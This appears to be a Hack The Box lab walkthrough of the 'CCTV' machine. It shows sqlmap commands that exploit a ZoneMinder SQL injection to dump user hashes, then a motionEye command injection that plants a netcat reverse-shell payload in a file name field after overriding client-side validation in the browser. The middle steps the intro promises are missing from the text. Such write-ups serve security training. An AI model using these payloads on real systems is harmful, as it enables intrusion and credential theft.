> In this walkthrough, we compromise the Hack The Box **CCTV** machine by enumerating a **ZoneMinder** instance, exploiting a **boolean-based SQL Injection vulnerability (CVE-2024-51482)** to dump user credentials, cracking password hashes with **Hashcat**, gaining SSH access as a valid user, discovering an internal **motionEye** service via local enumeration, and finally exploiting **CVE-2025-60787** to achieve remote code execution as root and capture both user and root flags.

## CVE-2024-51482

This version of `ZoneMinder` is vulnerable to a **boolean-based SQL Injection**.

PoC: [Github](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)

According to the PoC, the vulnerable endpoint is:

```shell
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```
{: .nolineno }

![](the_PoC_enpoint.png){: width="800" height="400" .shadow }

```shell
$ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=<YOUR_COOKIE>"-p tid --dbs --batch
```
{: .nolineno }

![](available_dbs.png){: width="800" height="400" .shadow }

To save time, we focus on the `Users` table inside the `zm` database:

```shell
$ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=<YOUR_COOKIE>" -D zm -T Users -C Name,Password,Email --dump --batch
```
{: .nolineno }

![](zm_users_table.png){: width="800" height="400" .shadow }

We use `hashid` to identify the hash type:

```shell
$ hashid -m '$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m'
```
{: .nolineno }

![](hashid.png){: width="800" height="400" .shadow }

Save the hashes into a file:

## root shell - CVE-2025-60787 

Expanding the sidebar, we can see the `motionEye` version:

![](motioneye_version.png){: width="800" height="400" .shadow }

Searching for `motioneye 0.43.1b4 exploits` leads us to:

- CVE-2025-60787
    
- PoC: [Github](https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j945-qm58-4gjx)
    

This vulnerability exists because client-side validation in motionEye can be bypassed. By overriding the JavaScript validation function, we can inject arbitrary values (including shell commands) into the configuration. When the service restarts, those commands are executed.

PoC:

```text
$(touch /tmp/test).%Y-%m-%d-%H-%M-%S
```

Reverse shell payload:

```shell
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 9001 >/tmp/f
```
{: .nolineno }

Final payload:

```text
$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 9001 >/tmp/f).%Y-%m-%d-%H-%M-%S
```

Since validation is only client-side, we override it in the browser:

Open DevTools (`F12`) → Console:

```js
configUiValid = function() { return true; };
```

![](console_ovverwrite_func.png){: width="800" height="400" .shadow }

Now we can insert the payload:

![](place_payload.png){: width="800" height="400" .shadow }

- Set **Capture Mode**: `Interval Snapshots`
    
- Set **Interval**: `10`
    
- Set **Image File Name** to the payload:
    

```shellell
$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 9001 >/tmp/f).%Y-%m-%d-%H-%M-%S
```
{: .nolineno }

> ⚠️ Don't forget to replace `<YOUR_IP>` with your machine IP.

After a few seconds, we receive a reverse shell as root:

![](root_shell.png){: width="800" height="400" .shadow }
